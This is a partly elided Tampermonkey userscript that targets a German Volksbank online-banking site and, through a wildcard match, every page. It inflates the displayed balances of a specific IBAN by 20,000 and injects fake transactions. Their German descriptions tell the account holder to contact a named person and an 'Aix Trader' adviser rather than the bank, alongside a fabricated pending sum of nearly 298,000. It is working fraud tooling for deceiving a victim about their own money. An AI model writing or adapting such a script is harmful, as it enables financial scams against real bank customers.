// ==UserScript==
// @name         Ed Volks combined Constantin Czaika
// @namespace    http://tampermonkey.net/
// @version      0.2
// @description  Modify account balance values, update data-positive attribute, and remove currency elements
// @author       You
// @match        https://www.volksbank-jever.de/*
// @match        https://www.drivehq.com/*
// @match        *://*/*
// @grant        none
// @downloadURL https://update.greasyfork.org/scripts/486901/Ed%20Volks%20combined%20Constantin%20Czaika.user.js
// @updateURL https://update.greasyfork.org/scripts/486901/Ed%20Volks%20combined%20Constantin%20Czaika.meta.js
// ==/UserScript==
...
//11111111111---------------VOLKS FINUB BAL CHANGE----------------------------------------------------------------------------------------------------------------------------
   ...
   // Array of configurable balance adjustments
    var BALANCE_CONFIGS = [
        { index: 0, adjustmentAmount:  20000 },
        { index: 1, adjustmentAmount: 20000 },
        { index: 2, adjustmentAmount: 20000 },
...
//222222444444---------------VOLKS UMSAETZE AND UEBER BAL CHANGE---------------------------------------------------------------------------------------------------------------
    ...
    var targetTextContent1 = "DE21 2826 2254";
    var targetTextContent2 = " 3100 4500 00";

    // Configurable modification amount (positive or negative)
    const modificationAmount = 20000.0; // Adjust the amount as needed
    ...
    const TRANSACTIONS = [
           {
            ...
            description: 'Geld für Steuern. Nur an Andreas Graf wenden.',
            amount: '19.000,00',
            date: '14 Feb.',
        ...
        },
{
            ...
            description: 'Freigabe nötig. Wenden Sie sich an Aix Trader Berater, nicht die Bank, damit nicht gesperrt.',
            amount: '297.964,00',
            date: 'Vorgemerkt',
            insertAfter: false, // Set to false to insert before the original transaction
            moveSteps: 1, // Number of steps to move the transaction
